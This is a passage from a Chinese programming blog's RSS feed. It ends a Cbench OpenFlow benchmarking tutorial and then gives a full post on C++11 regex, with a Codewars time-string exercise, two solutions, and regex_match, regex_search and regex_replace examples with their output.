$&#123;cycle&#125; $&#123;mode&#125; &gt; ./cbench_s$&#123;i&#125;</span><br><span class="line">  done</span><br></pre></td></tr></table></figure></p><p>上面的脚本就是分别测试控制器连接不同交换机是的最大吞吐量，分别对结果写入到命名为cbech_s1、cbech_s2、… 、cbech_s10的文件中。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>Cbench，一个优秀的基于OpenFlow的性能测试工具，不接触它以为他不容易使用，接触后发现也就那么回事，利其器、善其事，科研的道路上不是只有公式和推理，还有更多的实验呀。</p>]]></content:encoded>
      
      <comments>http://prayallforyou.top/2017/11/27/cben-tutorial/#disqus_thread</comments>
    </item>
    
    <item>
      <title>C++中的正则表达式regex</title>
      <link>http://prayallforyou.top/2017/11/17/regex-c/</link>
      <guid>http://prayallforyou.top/2017/11/17/regex-c/</guid>
      <pubDate>Fri, 17 Nov 2017 13:02:50 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;苍了个天了,C++中居然正则表达式的库&lt;strong&gt;regex&lt;/strong&gt;，竟然之前都没听说过，更别说用了。先来感受一下它的威力。出个题目测试一下（来自&lt;a href=&quot;https://www.codewars.com/&quot; target=&quot;_blank&quot; rel=&quot;
        
      
      </description>
      
      <content:encoded><![CDATA[<p>苍了个天了,C++中居然正则表达式的库<strong>regex</strong>，竟然之前都没听说过，更别说用了。先来感受一下它的威力。出个题目测试一下（来自<a href="https://www.codewars.com/" target="_blank" rel="external">codewars</a>）。</p><blockquote><p>A new task for you!<br>You have to create a method, that corrects a given time string. There was a problem in addition, so many of the time strings are broken. Time-Format is european. So from “00:00:00” to “23:59:59”.<br>Some examples:<br>“09:10:01” -&gt; “09:10:01”<br>“11:70:10” -&gt; “12:10:10”<br>“19:99:99” -&gt; “20:40:39”<br>“24:01:01” -&gt; “00:01:01”<br>If the input-string is null or empty return exactly this value! (empty string for C++)<br>If the time-string-format is invalid, return null. (empty string for C++)</p></blockquote><p>相信看上面几个例子就明白了，就是给定一串字符，判断是不是正常的可读时间格式，如果字符为空或是格式不正确就返回空字符串，否则调整输入的字符串为正常的可读时间格式。</p><p>没用正则式之前，我是这样写的，调试良久（智商捉急~~~）。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">std::string correct(std::string timeString)</span><br><span class="line">&#123; </span><br><span class="line">    bool invalid(std::string str);</span><br><span class="line">    void process(std::string &amp;str);</span><br><span class="line">    //判断是否为空或是不合法</span><br><span class="line">    if(timeString.empty()||invalid(timeString))&#123;</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    //如果合法，调整为正确格式</span><br><span class="line">    process(timeString);</span><br><span class="line">    return timeString;</span><br><span class="line">&#125;</span><br><span class="line">//调整时间格式</span><br><span class="line">void process(std::string &amp;time)&#123;</span><br><span class="line">    int second_high=0;   //进位符，秒数高位</span><br><span class="line">    int minute_low=0;    //进位符，分数低位</span><br><span class="line">    int minute_high=0;   //进位符，分数高位</span><br><span class="line">    int hour_low=0;      //进位符，小时数低位位</span><br><span class="line">    if(time[6]&gt;&apos;5&apos;)&#123;          //秒数是否需要调整</span><br><span class="line">        second_high=1;</span><br><span class="line">        time[6]-=6;</span><br><span class="line">    &#125;</span><br><span class="line">    if(time[4]+second_high&gt;&apos;9&apos;)&#123; //分钟数是否需要调整</span><br><span class="line">        minute_low=1;</span><br><span class="line">        time[4]-=9;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        time[4]+=second_high;</span><br><span class="line">    &#125;</span><br><span class="line">    if(time[3]+minute_low&gt;&apos;5&apos;)&#123;</span><br><span class="line">        minute_high=1;</span><br><span class="line">        if(minute_low)&#123;</span><br><span class="line">            time[3]-=5;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            time[3]-=6;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        time[3]+=minute_low;</span><br><span class="line">    &#125;</span><br><span class="line">    if(time[1]+minute_high&gt;&apos;9&apos;)&#123;  //小时数是否需要调整</span><br><span class="line">        hour_low=1;</span><br><span class="line">        time[1]-=9;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        time[1]+=minute_high;</span><br><span class="line">    &#125;</span><br><span class="line">    if(time[0]+hour_low&gt;&apos;1&apos;)&#123;</span><br><span class="line">        time[0]+=hour_low;</span><br><span class="line">        int num=time[1]-&apos;0&apos;+10*(time[0]-&apos;0&apos;);</span><br><span class="line">        int counts=num%24;</span><br><span class="line">        time[1]=&apos;0&apos;+counts%10;</span><br><span class="line">        time[0]=&apos;0&apos;+counts/10;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//判断格式是否合法</span><br><span class="line">bool invalid(std::string time)&#123;</span><br><span class="line">    if(time.length()!=8)&#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    for(int i=0;i&lt;8;i++)&#123;</span><br><span class="line">        if(i==2||i==5)&#123;</span><br><span class="line">            if(time[i]!=&apos;:&apos;)&#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">             if(time[i]&lt;&apos;0&apos;||time[i]&gt;&apos;9&apos;)&#123;</span><br><span class="line">                 return true;</span><br><span class="line">             &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>啰啰嗦嗦写了一大串，好在最后调通了，去讨论区看看别人家的代码，真心值得学习。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;regex&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line"></span><br><span class="line">std::string correct(std::string timeString)</span><br><span class="line">&#123; </span><br><span class="line">    std::regex mask(&quot;(\\d\\d):(\\d\\d):(\\d\\d)&quot;);</span><br><span class="line">    std::cmatch cm;</span><br><span class="line">    </span><br><span class="line">    if (std::regex_match(timeString.c_str(),cm,mask))</span><br><span class="line">    &#123;</span><br><span class="line">      int h = atoi(cm[1].first);</span><br><span class="line">      int m = atoi(cm[2].first);</span><br><span class="line">      int s = atoi(cm[3].first);</span><br><span class="line">      </span><br><span class="line">      m += s/60;</span><br><span class="line">      h += m/60;</span><br><span class="line">      s %= 60;</span><br><span class="line">      m %= 60;</span><br><span class="line">      h %= 24;</span><br><span class="line">      </span><br><span class="line">      char result[9];</span><br><span class="line">      sprintf(result,&quot;%02d:%02d:%02d&quot;,h,m,s);</span><br><span class="line">      return std::string(result);</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    return &quot;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>看看别人家的代码，才知道成长的路还很长。</p><p>扯了这么多，接下来好好聊聊C++中的regex。标准的C++11库提供了对正则表达式的支持，位于regex头文件中。一个典型的正则式必须包含必要的参数：</p><ul><li>目标序列: 即要搜索的字符序列，一般有两个确定范围的迭代器表示，也接受C类型的字符串或是string类型。</li><li>正则表达式: 即在目标序列中要查找的内容的模式，由符合正则语法的字符构成。</li><li>匹配序列: 目标序列中符合正则表达式条件的匹配序列。</li><li>替换字符串: 去替换匹配序列内容的字符串.</li></ul><p>regex库中实现了好多功能，具体参加<a href="http://www.cplusplus.com/reference/regex/" target="_blank" rel="external">C++ reference</a>,其中我们经常用到的不外乎三个：regex_match、regex_search、regex_replace。</p><ul><li><p>regex_match:匹配函数，成功匹配返回<em>true</em>，失败返回<em>false</em>。主要有三种形式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bool regex_match(const string &amp;str,const regex &amp;mask)//最简单，目标序列为一个字符串，正则表达式为mask</span><br><span class="line">bool regex_match(const string &amp;str.begin(), const string &amp;str.end(),const regex &amp;mask); //有迭代器指示目标序列的范围</span><br><span class="line">bool regex_match(const string &amp;str, cmatch cm, regex &amp;mask);//就匹配结果存放到cmath变量中。（参加上面的例子理解）</span><br></pre></td></tr></table></figure></li><li><p>regex_search:获得匹配的字符串。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// regex_search example</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line">#include &lt;regex&gt;</span><br><span class="line"></span><br><span class="line">int main ()</span><br><span class="line">&#123;</span><br><span class="line">  std::string s (&quot;this subject has a submarine as a subsequence&quot;);</span><br><span class="line">  std::smatch m;</span><br><span class="line">  std::regex e (&quot;\\b(sub)([^ ]*)&quot;);   // matches words beginning by &quot;sub&quot;</span><br><span class="line"></span><br><span class="line">  std::cout &lt;&lt; &quot;Target sequence: &quot; &lt;&lt; s &lt;&lt; std::endl;</span><br><span class="line">  std::cout &lt;&lt; &quot;Regular expression: /\\b(sub)([^ ]*)/&quot; &lt;&lt; std::endl;</span><br><span class="line">  std::cout &lt;&lt; &quot;The following matches and submatches were found:&quot; &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">  while (std::regex_search (s,m,e)) &#123;</span><br><span class="line">    for (auto x:m) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;;</span><br><span class="line">    std::cout &lt;&lt; std::endl;</span><br><span class="line">    s = m.suffix().str();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>运行结果：</p><blockquote><p>Target sequence: this subject has a submarine as subsequence<br>Regular expression: /\b(sub)([^ ]*)/<br>The following matches and submatches were found:<br>subject sub ject<br>submarine sub marine<br> subsequence sub sequence</p><ul><li>regex_replace:替换匹配的字符串。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// regex_replace example</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line">#include &lt;regex&gt;</span><br><span class="line">#include &lt;iterator&gt;</span><br><span class="line"></span><br><span class="line">int main ()</span><br><span class="line">&#123;</span><br><span class="line">  std::string s (&quot;there is a subsequence in the string\n&quot;);</span><br><span class="line">  std::regex e (&quot;\\b(sub)([^ ]*)&quot;);   // matches words beginning by &quot;sub&quot;</span><br><span class="line"></span><br><span class="line">  // using string/c-string (3) version:</span><br><span class="line">  std::cout &lt;&lt; std::regex_replace (s,e,&quot;sub-$2&quot;);</span><br><span class="line"></span><br><span class="line">  // using range/c-string (6) version:</span><br><span class="line">  std::string result;</span><br><span class="line">  std::regex_replace (std::back_inserter(result), s.begin(), s.end(), e, &quot;$2&quot;);</span><br><span class="line">  std::cout &lt;&lt; result;</span><br><span class="line"></span><br><span class="line">  // with flags:</span><br><span class="line">  std::cout &lt;&lt; std::regex_replace (s,e,&quot;$1 and $2&quot;,std::regex_constants::format_no_copy);</span><br><span class="line">  std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></blockquote><p>运行结果：</p><blockquote><p>there is a sub-sequence in the string<br>there is a sequence in the string<br>sub and sequence</p></blockquote>]]></content:encoded>
      
      <comments>http://prayallforyou.top/2017/11/17/regex-c/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
